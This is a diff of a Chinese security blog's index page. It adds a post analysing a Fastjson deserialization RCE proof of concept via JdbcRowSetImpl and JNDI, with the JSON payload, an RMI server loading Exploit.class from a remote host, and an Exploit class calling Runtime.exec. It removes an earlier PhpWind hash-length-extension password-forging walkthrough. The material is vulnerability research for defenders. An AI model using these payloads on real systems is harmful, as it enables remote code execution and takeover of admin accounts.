@@ -331,6 +331,188 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" itemprop="url">
+                  基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-06T21:41:42+08:00">
+                2017-12-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" class="leancloud_visitors" data-flag-title="基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>这篇文章主要是基于我在看雪2017开发者峰会的演讲而来，由于时间和听众对象的关系，在大会上主要精力都集中在反序列化的防御上。前面的Fastjson PoC的构造分析涉及得很少，另外我在5月份分享的Fastjson Poc构造与分析限制条件太多，所以写下这篇文章。</p>
+<h2 id="Fastjson-使用"><a href="#Fastjson-使用" class="headerlink" title="Fastjson 使用"></a>Fastjson 使用</h2><p>Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端<br>提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化。项目地址：<code>https://github.com/alibaba/fastjson</code>。那我们看下如何使用？首先定义一个User.java,代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> Long   id;</div><div class="line">    <span class="keyword">private</span> String name;</div><div class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> id;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.id = id;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> name;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>序列化的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</div><div class="line">User guestUser = <span class="keyword">new</span> User();</div><div class="line">guestUser.setId(<span class="number">2L</span>);</div><div class="line">guestUser.setName(<span class="string">"guest"</span>);</div><div class="line">String jsonString = JSON.toJSONString(guestUser);</div><div class="line">System.out.println(jsonString);</div></pre></td></tr></table></figure></p>
+<p>反序列化的代码示例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">String jsonString = <span class="string">"&#123;\"name\":\"guest\",\"id\":12&#125;"</span>;</div><div class="line">User user = JSON.parseObject(jsonString, User.class);</div></pre></td></tr></table></figure></p>
+<p>上述代码的parseObject也可以直接用parse接口。</p>
+<h2 id="Fastjson安全特性"><a href="#Fastjson安全特性" class="headerlink" title="Fastjson安全特性"></a>Fastjson安全特性</h2><p>反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类，调用其set，get，is方法。<br><img src="/images/JdbcRowSetImpl_1.png" alt="1"><br>上图则是Fastjson反序列框架图。JSON门面类，提供一些静态方法，如parse，parseObject.其主要功能都是在DefaultJSONParser类中实现。DefaultJSONParser引用了ParserConfig，主要保存一些相关配置信息。也引用了JSONLexerBase，这个类用来处理字符分析。而反序列化用到的JavaBeanDeserializer则是JavaBean反序列化处理主类。fastjson在1.2.24版本添加enable_autotype开关，将一些类加到黑名单中，后续我也给它报过bypass，fastjson也一并修复。</p>
+<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI即Java Naming and Directory Interface，翻译成中文就Java命令和目录接口，2016年的blackhat大会上web议题重点讲到，但是对于json这一块没有涉及。JNDI提供了很多实现方式，主要有RMI，LDAP，CORBA等。我们可以看一下它的架构图<br>!(2)[/images/JdbcRowSetImpl_2.png]，JNDI提供了一个统一的外部接口，底层SPI则是多样的。在使用JNDIReferences的时候可以远程加载外部的对象，即实现factory的初始化。如果说其lookup方法的参数是我们可以控制的，可以将其参数指向我们控制的RMI服务，切换到我们控制的RMI/LDAP服务等等。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</div><div class="line"><span class="comment">//http://xxlegend.com/Exploit.class</span></div><div class="line">Reference reference = <span class="keyword">new</span> javax.naming.Reference(“Exploit<span class="string">",“Exploit"</span>,<span class="string">"http://xxlegend.com/"</span>);</div><div class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</div><div class="line">registry.bind(“Exploit<span class="string">", referenceWrapper);</span></div></pre></td></tr></table></figure></p>
+<p>这段代码主要讲到了在1099端口上创建一个RMI服务，RMI的内容则是通过外部的http服务地址获取。在客户端则是将lookup的地址指向刚才我们创建的RMI服务，即能达到远程代码执行的目的。可以使用如下的请求端代码进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hashtable env = new Hashtable();</div><div class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</div><div class="line">env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);</div><div class="line">Context ctx = new InitialContext(env);</div><div class="line">Object local_obj = RicterCctx.lookup(&quot;rmi://xxlegend.com/Exploit&quot;);</div></pre></td></tr></table></figure></p>
+<p>那么攻击者的流程就是这样的。攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
+<h1 id="PoC构造与分析"><a href="#PoC构造与分析" class="headerlink" title="PoC构造与分析"></a>PoC构造与分析</h1><p>介绍的背景有点多，正式切入我们的正题，基于JdbcRowSetImpl的PoC是如何构造和执行的。在今年5月份的时候，我也公布了Fastjson基于TemplateImpl的PoC的，但是限制还比较多，需要打开SupportNonPublic开关，这个场景是比较少见的，详细的分析见我的博客<code>http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</code>，后续ricterz也作了一篇分析：<code>https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up</code>。<br>在看雪峰会上我提到了好几种PoC，下面我简单的给这些PoC做个分类：<br>1，基于TemplateImpl<br>2，基于JNDI Bean Property类型<br>3，基于JNDI Field类型</p>
+<p>今天主讲基于JNDI Bean Property这个类型，这个类型和JNDI Field类型的区别就在于Bean Property需要借助setter，getter方法触发，而Field类型则没有这个必要。JdbcRowSetImpl刚好就在Bean Property分类之下，其他的PoC后续再讲。这个Poc相对于TemplateImpl却没有一点儿限制，当然java在JDK 6u132, 7u122, or 8u113补了是另外一码事。 PoC具体如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:389/obj"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</div></pre></td></tr></table></figure></p>
+<p>由于这个PoC是基于JNDI，下面我们简单构造一下，首先是服务端的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span></span></div><div class="line">            AlreadyBoundException, RemoteException, NamingException &#123;</div><div class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</div><div class="line">        <span class="comment">//http://xxlegend.com/Exploit.class即可</span></div><div class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exloit"</span>,</div><div class="line">                <span class="string">"Exploit"</span>,<span class="string">"http://xxlegend.com/"</span>);</div><div class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</div><div class="line">        registry.bind(<span class="string">"Exploit"</span>,referenceWrapper);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</div><div class="line">        start();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>rmi服务端需要一个Exploit.class放到rmi指向的web服务器目录下，这个Exploit.class是一个factory，通过Exploit.java编译得来，在JNDI执行的过程会被初始化。如下是Exploit.java的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</div><div class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</div><div class="line">        Exploit e = <span class="keyword">new</span> Exploit();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>服务端构造好之后，下面来看java应用执行的代码，示例如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</div><div class="line">        testJdbcRowSetImpl();</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testJdbcRowSetImpl</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">//        String payload = "&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," +</span></div><div class="line"><span class="comment">//                " \"autoCommit\":true&#125;";</span></div><div class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\","</span> +</div><div class="line">                <span class="string">" \"autoCommit\":true&#125;"</span>;</div><div class="line">        JSON.parse(payload);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>完整的代码已经放到<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">PoC调用栈如下</div><div class="line">![3](/images/JdbcRowSetImpl_3.png)</div><div class="line">从这个调用栈就可以看出，在进入Gadget之前，首先是Java应用调用Fastjson的parseObject或者parse接口，进入JavaObjectDeserializer.deserialize方法，经过一系列判断之后发现是JavaBean，就会调用JavaBeanDeserializer.deserialize接口,反序列化得到Gadget相关域，在这个过程中都是通过反射调用这些域的getter，setter或者is方法，这就正式在Gadget执行代码。下面看一下在Gadget中执行的代码。在反序列化过程中是有次序来调用相应接口的，首先是设置dataSourceName属性，这个是其父类BaseRowSet继承过来的。</div><div class="line">```java</div><div class="line">public void setDataSourceName(String name) throws SQLException &#123;</div><div class="line"></div><div class="line">    if (name == null) &#123;</div><div class="line">        dataSource = null;</div><div class="line">    &#125; else if (name.equals(&quot;&quot;)) &#123;</div><div class="line">       throw new SQLException(&quot;DataSource name cannot be empty string&quot;);</div><div class="line">    &#125; else &#123;</div><div class="line">       dataSource = name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    URL = null;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>设置autoCommit属性:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</div><div class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这setAutoCommit里函数里会触发connect函数。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</div><div class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>)?var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):var2.getConnection();</div><div class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span>?DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):<span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里面就调用InitialContext的lookup方法，而且找到的就是我们前面设置的DataSourceName(),达到远程调用任意类的目的。由于JdbcRowSetImpl是官方自带的库，所以这个PoC的威力相对来说更厉害。如果还在使用Fastjson 1.2.24版本及以下烦请升级。</p>
+<p>引用：<br>1，<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a><br>2,<a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/11/23/Java JSON反序列化之殇-看雪安全开发者峰会/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1968,182 +2150,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" itemprop="url">
-                  Phpwind利用hash长度扩展攻击修改后台密码getshell
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-08-01T15:38:36+08:00">
-                2016-08-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Php/" itemprop="url" rel="index">
-                    <span itemprop="name">Php</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" class="leancloud_visitors" data-flag-title="Phpwind利用hash长度扩展攻击修改后台密码getshell">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#1 哈希长度扩展攻击</p>
-<p>##1.1 简介<br>哈希长度扩张攻击（hash length attack）是一类针对某些哈希函数可以额外添加一些信息的攻击手段，适用于已经确定哈希值和密钥长度的情况。哈希值基本表示如下H（密钥||消息），即知道了哈希值和密钥的长度，可以推出H（密钥||消息||padding||append）的哈希值，padding是要填充的字段，append则是要附加的消息。其实如果不知道密钥长度，可通过暴力猜解得到，已知的有长度扩展攻击缺陷的函数有MD5，SHA-1，SHA-256等等,详细的攻击原理可参考<a href="Everything%20you%20need%20to%20know%20about%20hash%20length%20extension%20attacks">Everything you need to know about hash length extension attacks</a></p>
-<p>##1.2 利用<br>这里推荐有python扩展的HashPump，HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。<br>安装：<code>pip install hashpumpy</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# hashpump --help</div><div class="line">HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]</div><div class="line">     HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</div><div class="line">     -h --help          Display this message.</div><div class="line">     -t --test          Run tests to verify each algorithm is operating properly.</div><div class="line">     -s --signature     The signature from known message.</div><div class="line">     -d --data          The data from the known message.</div><div class="line">     -a --additional    The information you would like to add to the known message.</div><div class="line">     -k --keylength     The length in bytes of the key being used to sign the original message with.</div><div class="line">     Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</div><div class="line">     &lt;Developed by bwall(@botnet_hunter)&gt;</div></pre></td></tr></table></figure></p>
-<p>-s参数对应的就是H(密钥||消息)中的哈希值，-d参数对应着消息，-k参数对应着密钥的长度，-a则是要附加的消息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# hashpump -s &quot;ebfe0fff1806cfe6186c6a0b172e8148&quot; -d &quot;1465895192adoAvatarcavatarmapitypeflashuid2uidundefined&quot; -k 32 -a namespacesiteaeditUsercusermapipasswordGongFang9uid1</div><div class="line">4daee9a61955a1c17319f4c1664d11df</div><div class="line">1465895192adoAvatarcavatarmapitypeflashuid2uidundefined\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x00\x00\x00namespacesiteaeditUsercusermapipasswordGongFang9uid1</div></pre></td></tr></table></figure></p>
-<p>最后提供一个哈希扩展攻击在线工具：<a href="http://sakurity.com/lengthextension，需要注意的长度是密钥+消息的总长度，详情见图：![此处输入图片的描述][2" target="_blank" rel="external">http://sakurity.com/lengthextension，需要注意的长度是密钥+消息的总长度，详情见图：![此处输入图片的描述][2</a>]</p>
-<p>#2 phpwind利用点分析<br>phpwind会在每次请求的时候校验密钥，具体的对应函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">public  function beforeAction($handlerAdapter) &#123;</div><div class="line">	parent::beforeAction($handlerAdapter);</div><div class="line">	$charset = &apos;utf-8&apos;;</div><div class="line">	$_windidkey = $this-&gt;getInput(&apos;windidkey&apos;, &apos;get&apos;);</div><div class="line">	$_time = (int)$this-&gt;getInput(&apos;time&apos;, &apos;get&apos;);</div><div class="line">	$_clientid = (int)$this-&gt;getInput(&apos;clientid&apos;, &apos;get&apos;);</div><div class="line">	if (!$_time || !$_clientid) $this-&gt;output(WindidError::FAIL);</div><div class="line">	$clent = $this-&gt;_getAppDs()-&gt;getApp($_clientid);</div><div class="line">	if (!$clent) $this-&gt;output(WindidError::FAIL);</div><div class="line">	if (WindidUtility::appKey($clent[&apos;id&apos;], $_time, $clent[&apos;secretkey&apos;], $this-&gt;getRequest()-&gt;getGet(null), $this-&gt;getRequest()-&gt;getPost()) != $_windidkey)  $this-&gt;output(WindidError::FAIL);</div><div class="line">	</div><div class="line">	$time = Pw::getTime();</div><div class="line">	if ($time - $_time &gt; 1200) $this-&gt;output(WindidError::TIMEOUT);</div><div class="line">	$this-&gt;appid = $_clientid;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
